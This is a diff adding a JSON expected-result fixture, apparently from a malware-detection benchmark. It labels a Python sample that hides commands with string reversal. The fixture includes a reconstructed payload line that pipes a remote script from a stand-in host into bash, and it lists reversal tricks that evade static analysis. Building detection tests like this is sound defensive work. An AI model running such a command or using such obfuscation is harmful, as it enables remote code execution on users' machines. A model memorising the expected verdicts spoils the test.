@@ -1,0 +1,43 @@
+{
+  "sample_id": "adv-019-string-reverse",
+  "test_category": "string_manipulation_obfuscation",
+  "primary_detection": {
+    "code": "STRING-003",
+    "name": "String Reversal Obfuscation",
+    "description": "Malicious commands hidden using Python string reversal slice notation [::-1]",
+    "confidence": 0.93
+  },
+  "underlying_threats": [
+    {
+      "code": "DATA-002",
+      "name": "Remote Code Execution",
+      "description": "Downloads and executes remote malware via curl/wget piped to bash",
+      "confidence": 0.94
+    },
+    {
+      "code": "EXEC-003",
+      "name": "Dynamic Code Execution",
+      "description": "Uses exec() with reversed import statements and commands",
+      "confidence": 0.92
+    },
+    {
+      "code": "EXEC-001",
+      "name": "Shell Command Injection",
+      "description": "Executes shell commands via subprocess with shell=True",
+      "confidence": 0.90
+    }
+  ],
+  "obfuscation_indicators": [
+    "Python slice reversal [::-1] applied to command strings",
+    "URL components stored in reversed form",
+    "Module names 'os' stored as 'so'[::-1]",
+    "Method names 'system' stored as 'metsys'[::-1]",
+    "Import statement 'import' stored as 'tropmi'[::-1]",
+    "Nested reversal operations to reconstruct payload"
+  ],
+  "reconstructed_payload": "curl https://[REDACTED].example.com/malware.sh | bash",
+  "expected_verdict": "确认恶意",
+  "verdict_reasoning": "Deliberate use of string reversal to hide malicious command keywords from static analysis",
+  "risk_level": "critical",
+  "tags": ["obfuscation", "string-reverse", "slice-notation", "remote-code-execution", "exec"]
+}
